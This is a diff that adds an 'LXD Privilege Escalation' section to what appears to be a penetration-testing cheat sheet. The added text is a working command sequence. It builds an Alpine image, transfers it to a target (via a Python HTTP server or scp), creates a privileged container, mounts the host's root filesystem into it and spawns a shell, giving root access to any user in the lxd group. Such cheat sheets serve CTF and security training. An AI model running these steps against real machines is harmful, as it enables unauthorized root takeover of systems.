@@ -46,6 +46,7 @@
 * [Linux Password](#Linux-Password)
 * [Custom Wordlists](#Custom-Wordlists)
 * [Crontab](#Crontab)
+* [LXD Privilege Escalation](#LXD-Privilege-Escalation)
 
 ## Windows
 * [Windows Password](#Windows-Password)
@@ -754,6 +755,54 @@ crontab -e
 # | | --------- Day (1 - 31)
 # | ----------- Hour (0 - 23)
 # ------------- Minute (0 - 59)
+```
+
+# LXD Privilege Escalation
+
+### LXD Group
+```
+$ id
+... groups=108(lxd) ...
+```
+
+### Attacker Machine
+```
+# Clone repository
+git clone https://github.com/saghul/lxd-alpine-builder.git
+
+# Build image package
+sudo ./lxd-alpine-builder/build-alpine
+
+# Rename image package
+mv alpine-v3.13-x86_64-20210426_2250.tar.gz alpine.tar.gz
+
+# Transfer file to target machine
+# Ex1.: python -m SimpleHTTPServer 80
+# Ex2.: scp alpine.tar.gz {USER}@{TARGET}:/tmp
+```
+
+### Target Machine
+```
+# Import image
+lxc image import ./alpine.tar.gz --alias myimage
+
+# List images
+lxc image list
+
+# Init
+lxc init myimage ignite -c security.privileged=true
+
+# Mapping / direcotry to image's /mnt/root
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+
+# Starting
+lxc start ignite
+
+# Spawn image's shell
+lxc exec ignite /bin/sh
+
+# Enter in mounted directory
+cd /mnt/root/
 ```
 
 
